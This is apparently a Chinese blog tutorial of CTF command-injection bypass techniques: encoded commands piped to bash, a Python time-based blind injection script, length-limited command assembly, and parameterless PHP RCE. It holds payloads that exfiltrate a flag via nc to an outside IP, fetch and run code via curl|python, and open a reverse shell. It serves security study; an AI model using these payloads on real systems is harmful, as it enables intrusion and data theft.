<p>上面echo Y2F0IGZsYWcucGhw | base64 -d</p>
<p>意思就是  echo Y2F0IGZsYWcucGhw的结果为Y2F0IGZsYWcucGhw</p>
<p>然后变成base64 -d Y2F0IGZsYWcucGhw   这里对Y2F0IGZsYWcucGhw解码  成为cat flag.php</p>
<p>echo Y2F0IGZsYWcucGhw|base64 -d | bash  执行命令</p>
<p>|  把cat flag.php，  放在bash里执行   bash里可以成功执行命令</p>
<p>还可以用  <code>echo Y2F0IGZsYWcucGhw|base64 -d</code>      $(echo Y2F0IGZsYWcucGhw|base64 -d)  等  </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421154552855.png" alt="image-20250421154552855"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421154802665.png" alt="image-20250421154802665"></p>
<h3 id="2-base32编码"><a href="#2-base32编码" class="headerlink" title="2.base32编码"></a>2.base32编码</h3><h3 id="3-HEX编码"><a href="#3-HEX编码" class="headerlink" title="3.HEX编码"></a>3.HEX编码</h3><p>ASCII码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tac flag.php -&gt;74616320666c61672e706870</span><br><span class="line">echo &quot;74616320666c61672e706870&quot; | xxd -r -p | bash  </span><br><span class="line">?cmd=passthru(&#x27;echo &quot;74616320666c61672e706870&quot; | xxd -r -p | bash&#x27;);</span><br></pre></td></tr></table></figure>

<p>xxd:二进制显示和处理文件工具</p>
<p>-r -p将纯十六进制转储的反向输出打印为了ASCII格式</p>
<p>bash、sh、&#x2F;bin&#x2F;bash、反引号执行命令等</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421155351564.png" alt="image-20250421155351564"></p>
<h3 id="4-shellcode编码"><a href="#4-shellcode编码" class="headerlink" title="4.shellcode编码"></a>4.shellcode编码</h3><p>16进制的机器码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tac flag.php -&gt;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70</span><br><span class="line"></span><br><span class="line">echo &quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;  </span><br><span class="line"></span><br><span class="line">printf &quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot; </span><br><span class="line"></span><br><span class="line">?cmd=passthru(&#x27;printf &quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot; | bash&#x27;);</span><br><span class="line">?cmd=passthru(&#x27;`printf &quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;`&#x27;);反引号、$()</span><br><span class="line">?cmd=system(&#x27;$(printf &quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#x27;);system</span><br><span class="line">?cmd=passthru(&#x27;&#123;printf,&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;&#125;|bash&#x27;);</span><br><span class="line">这里用echo的话  可能无法正常执行命令</span><br></pre></td></tr></table></figure>

<p>这个会自动解码 不需要输入解码的命令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421155519127.png" alt="image-20250421155519127"></p>
<h2 id="0x11无回显时间盲注"><a href="#0x11无回显时间盲注" class="headerlink" title="0x11无回显时间盲注"></a>0x11无回显时间盲注</h2><h3 id="命令盲注"><a href="#命令盲注" class="headerlink" title="命令盲注"></a>命令盲注</h3><p>页面无法shell反弹或者无法回显，或者没有写入权限，可尝试命令盲注。</p>
<p>根据返回的时间来进行判断；</p>
<p>读取文件指定行的指定位置的字符；</p>
<p>if判断语句</p>
<h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><h4 id="1-sleep"><a href="#1-sleep" class="headerlink" title="1.sleep"></a>1.sleep</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep5  5秒之后返回结果</span><br></pre></td></tr></table></figure>

<h4 id="2-awk-NR"><a href="#2-awk-NR" class="headerlink" title="2.awk NR"></a>2.awk NR</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line"></span><br><span class="line">hello</span><br><span class="line"></span><br><span class="line">Flag&#123;success!!&#125;</span><br></pre></td></tr></table></figure>

<p>awk逐行获取数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat flag | awk NR==1</span><br><span class="line"></span><br><span class="line">hello</span><br><span class="line"></span><br><span class="line">cat flag | awk NR==2</span><br><span class="line"></span><br><span class="line">Flag&#123;success!!&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421224339689.png" alt="image-20250421224339689"></p>
<h4 id="3-cut-c"><a href="#3-cut-c" class="headerlink" title="3.cut -c"></a>3.cut -c</h4><p>cut命令逐列获取单个字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat flag | awk NR==12 | cut -c 1</span><br><span class="line"></span><br><span class="line">f</span><br><span class="line"></span><br><span class="line">cat flag | awk NR==12 | cut -c 2</span><br><span class="line"></span><br><span class="line">l</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421224727636.png" alt="image-20250421224727636"></p>
<h4 id="4-if语句"><a href="#4-if语句" class="headerlink" title="4.if语句"></a>4.if语句</h4><p>判断命令是否执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;$(cat flag.php | awk &#x27;NR==12&#x27; | cut -c 1)&quot; == &quot;f&quot; ]; then echo &quot;right&quot;; fi</span><br><span class="line"></span><br><span class="line">if [ &quot;$(cat flag.php | awk &#x27;NR==12&#x27; | cut -c 1)&quot; == &quot;a&quot; ]; then echo &quot;right&quot;; fi</span><br></pre></td></tr></table></figure>

<p>if[]里的判断语句为真，则执行echo “right”；否则执行fi结束</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421225909000.png" alt="image-20250421225909000"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;$(cat flag.php | awk &#x27;NR==12&#x27; | cut -c 1)&quot; == &quot;f&quot; ]; then sleep 5;fi</span><br></pre></td></tr></table></figure>

<p>if[]里判断语句为真，则执行sleep 5，休眠5秒后返回结果</p>
<p>py盲注脚本  ls &#x2F;查看根目录来获取flag文件名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.6:19080/class08/1.php&quot;</span>  //改成自己的ip地址</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">55</span>):</span><br><span class="line">        <span class="comment">#asciiç è¡¨</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            k=<span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="comment">#time.sleep(0.1)</span></span><br><span class="line">            payload = <span class="string">&quot;?cmd=&quot;</span> + <span class="string">f&quot;if [ `cat flag.php | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url+payload, timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x12长度过滤绕过前置知识"><a href="#0x12长度过滤绕过前置知识" class="headerlink" title="0x12长度过滤绕过前置知识"></a>0x12长度过滤绕过前置知识</h2><h3 id="符号和-符号"><a href="#符号和-符号" class="headerlink" title="&gt;符号和 &gt;&gt;符号"></a>&gt;符号和 &gt;&gt;符号</h3><p>1.通过&gt;来创建文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo benben &gt; a </span><br></pre></td></tr></table></figure>

<p>创建文件a，并把字符串’benben’写入到文件a里；</p>
<p>通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; b  直接创建文件b   类似touch b</span><br></pre></td></tr></table></figure>

<p>2.通过&gt;&gt;追加内容</p>
<h3 id="命令换行"><a href="#命令换行" class="headerlink" title="命令换行"></a>命令换行</h3><p>在没有写完的命令后面加”\“,可以将一条命令写在多行:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250422114101722.png" alt="image-20250422114101722"></p>
<p>相当于”\“把换行的命令连接到一起执行</p>
<h3 id="ls-t命令"><a href="#ls-t命令" class="headerlink" title="ls -t命令"></a>ls -t命令</h3><p>将文件名按照时间顺序排列出来(后创建的排在前面，即离我现在输入命令时间最近的在前面)</p>
<p>只能精确到秒</p>
<p>ls 是按字母顺序显示文件名（先符号后数字再字符）</p>
<h3 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h3><p>sh命令是shell命令语言解释器，</p>
<p>执行命令从标准输入读取或从一个文件中读取</p>
<h3 id="组合运用"><a href="#组合运用" class="headerlink" title="组合运用"></a>组合运用</h3><p>ls -t &gt;x</p>
<p>创建文件x</p>
<p>并把’ls -t’执行结果写入到文件x里；</p>
<p>ls -t 命令列出文件名。然后每个文件名按行储存；</p>
<p>对命令有长度限制时</p>
<p>把一些很短的文件名拼接成可执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;创建很短的文件名</span><br><span class="line">ls -t 按时间顺序列出文件名，按行存储</span><br><span class="line">\连接换行命令</span><br><span class="line">sh 从文件中读取命令</span><br></pre></td></tr></table></figure>

<h3 id="dir及-和rev"><a href="#dir及-和rev" class="headerlink" title="dir及 *和rev"></a>dir及 *和rev</h3><p><strong>dir：基本上和ls一样，但有两个好处</strong></p>
<p>一是开头字母是d，这使得它在alphabetical序中靠前；</p>
<p>二是按列输出，不换行。</p>
<p>***：相当于${dir <em>}</em>*</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir *</span><br><span class="line">echo ffff</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(dir *)      &gt;&gt;$(echo ffff)</span><br><span class="line">ffff</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">ffff</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250422120439083.png" alt="image-20250422120439083"></p>
<p>如果第一个文件名是命令的话就会执行命令，</p>
<p>返回执行的结果，之后的文件名作为参数传入。</p>
<p><strong>rev：可以反转文件每一行内容。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250422120623141.png" alt="image-20250422120623141"></p>
<h2 id="0x13长度为7绕过方法"><a href="#0x13长度为7绕过方法" class="headerlink" title="0x13长度为7绕过方法"></a>0x13长度为7绕过方法</h2><p>期望执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag|nc 121.40.70.148 2333</span><br></pre></td></tr></table></figure>

<p>自己服务器的ip</p>
<p>监听端口7777</p>
<p>nc -lvp 2333</p>
<p>cat flag展示内容</p>
<p>再通过nc 反弹</p>
<p>提交到  自己服务器ip:2333</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095456802.jpeg" alt="6f967f4f03bac8012864b43ece5f2b4e"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095523672.jpeg"></p>
<h2 id="0x14长度为5"><a href="#0x14长度为5" class="headerlink" title="0x14长度为5"></a>0x14长度为5</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095535788.jpeg" alt="d52626b21edc4f1f81b68dd7d1d06f4d"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095546076.jpeg" alt="8f0864797c369d6d23da65a097b6998a"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095556108.jpeg" alt="cc7451361225ec7e8eb5983e1a17793e"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095608299.jpeg" alt="7480448d92e6bd26b112f6e3a36b1938"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"># generate `ls -t&gt;g` to file &quot;_&quot;</span><br><span class="line"></span><br><span class="line">http://host/?cmd=&gt;ls\</span><br><span class="line">http://host/?cmd=ls&gt;_</span><br><span class="line">http://host/?cmd=&gt;\ \</span><br><span class="line">http://host/?cmd=&gt;-t\</span><br><span class="line">http://host/?cmd=&gt;\&gt;g</span><br><span class="line">http://host/?cmd=ls&gt;&gt;_</span><br><span class="line"></span><br><span class="line"># generate `curl orange.tw|python` to file &quot;g&quot;</span><br><span class="line"></span><br><span class="line">http://host/?cmd=&gt;on</span><br><span class="line">http://host/?cmd=&gt;th\</span><br><span class="line">http://host/?cmd=&gt;py\</span><br><span class="line">http://host/?cmd=&gt;\|\</span><br><span class="line">http://host/?cmd=&gt;tw\</span><br><span class="line">http://host/?cmd=&gt;e.\</span><br><span class="line">http://host/?cmd=&gt;ng\</span><br><span class="line">http://host/?cmd=&gt;ra\</span><br><span class="line">http://host/?cmd=&gt;o\</span><br><span class="line">http://host/?cmd=&gt;\ \</span><br><span class="line">http://host/?cmd=&gt;rl\</span><br><span class="line">http://host/?cmd=&gt;cu\</span><br><span class="line">http://host/?cmd=sh _</span><br><span class="line"></span><br><span class="line"># got shell</span><br><span class="line"></span><br><span class="line">http://host/?cmd=sh g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;-t\</span><br><span class="line">&gt;\&gt;a</span><br><span class="line">&gt;ls\</span><br><span class="line">&gt;ls&gt;b</span><br><span class="line">&gt;ls&gt;&gt;b</span><br><span class="line">&gt;bash</span><br><span class="line">&gt;8\|\</span><br><span class="line">&gt;4\</span><br><span class="line">&gt;0.1\</span><br><span class="line">&gt;0.7\</span><br><span class="line">&gt;4\</span><br><span class="line">&gt;21.\</span><br><span class="line">&gt;\ 1\</span><br><span class="line">&gt;url\</span><br><span class="line">&gt;c\</span><br><span class="line">&gt;sh b</span><br><span class="line">&gt;sh a</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="0x15长度为4"><a href="#0x15长度为4" class="headerlink" title="0x15长度为4"></a>0x15长度为4</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095620648.jpeg" alt="3ca5fd09aa1584c44259f7d088d973e8"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095632496.jpeg" alt="db3cde9e26b176f4ab6f6d716303d9c0"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095642220.jpeg" alt="395380bf5c77e35c94502d543c10d0ce"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095704459.jpeg" alt="c1c41c2ff73aea67285dcdc7f5265de0"></p>
<h2 id="0x16无参数命令执行"><a href="#0x16无参数命令执行" class="headerlink" title="0x16无参数命令执行"></a>0x16无参数命令执行</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095713949.jpeg" alt="b4eb5c3720bb080883ebc76e2c82553c"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250422202532230.png" alt="image-20250422202532230"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;,&quot;,$_GET[&#x27;code&#x27;])</span><br></pre></td></tr></table></figure>

<p>只要’code’里匹配到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^\W]+\((?R)?\)</span><br></pre></td></tr></table></figure>

<p>则替换为空</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^\W]+\((?R)?\)</span><br></pre></td></tr></table></figure>

<p>正则表达式**[^\W]**匹配字母、数字、下划线[A-Za-z0-9_]</p>
<p>**[^\W]+((?R)?)**匹配到”a()”形式的字符串，但是()内不能出现任何参数</p>
<p>(?R)代表递归，即a(b(c()))都能匹配到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">く?php</span><br><span class="line">Sa=<span class="string">&#x27;a()&#x27;</span>;.</span><br><span class="line"><span class="variable">$b</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>,<span class="string">&quot;, <span class="subst">$a</span>);</span></span><br><span class="line"><span class="string">print_r(<span class="subst">$b</span>);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>a()、a(b(c()))……格式的字符串，能被替换为空</p>
<p>$a&#x3D;’phpinfo();’,phpinfo()被替换为空，则$b&#x3D;’;’</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>匹配</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;&#x27;== preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;,&quot;,$_GET[&#x27;code&#x27;])</span><br></pre></td></tr></table></figure>

<p>则调用eval执行code&#x3D;’phpinfo();”，phpinfo()被替换为空，<br>则</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;&#x27;/[^\W]+\((?R)?\)/&#x27;, &quot;,$_GET[&#x27;code&#x27;])=&#x27;;&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="HTTP请求头绕过-php7-3"><a href="#HTTP请求头绕过-php7-3" class="headerlink" title="HTTP请求头绕过(php7.3)"></a>HTTP请求头绕过(php7.3)</h3><p>getallheaders()</p>
<p>获取所有HTTP请求标头</p>
<p>?code&#x3D;print_r(getallheaders());读取头部信息倒叙排列</p>
<p>写这个题记得要换到php7.3的环境   php5的环境这些函数应该还不能用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250422204357389.png" alt="image-20250422204357389"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(pos(getallheaders()));</span><br></pre></td></tr></table></figure>

<p>pos()把第一项的值显示出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(end(getallheaders()));</span><br></pre></td></tr></table></figure>

<p>end()把最后一项的值显示出来</p>
<p>apache_request_headers()</p>
<p>功能与getallheaders()相似，适用于Apache服务器</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250422204809434.png" alt="image-20250422204809434"></p>
<p>可以利用system(‘nc 192.168.248.130 -e \bin\bash’);进行shell反弹</p>
<h2 id="0x17无参数全局变量RCE-php5-7"><a href="#0x17无参数全局变量RCE-php5-7" class="headerlink" title="0x17无参数全局变量RCE(php5&#x2F;7)"></a>0x17无参数全局变量RCE(php5&#x2F;7)</h2><p>全局变量RCE</p>
<p>get_defined_vars()</p>
<p>返回所有已定义变量的值，所组成的数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(get_defined_vars());</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423195215093.png" alt="image-20250423195215093"></p>
<p>返回数组顺序为GET&gt;POST&gt;COOKIE&gt;FILES</p>
<p><strong><code>FILES</code> 是 PHP 中的一个超级全局变量，准确地说是 <code>$_FILES</code>。它用于处理通过 HTTP POST 方法上传的文件。</strong></p>
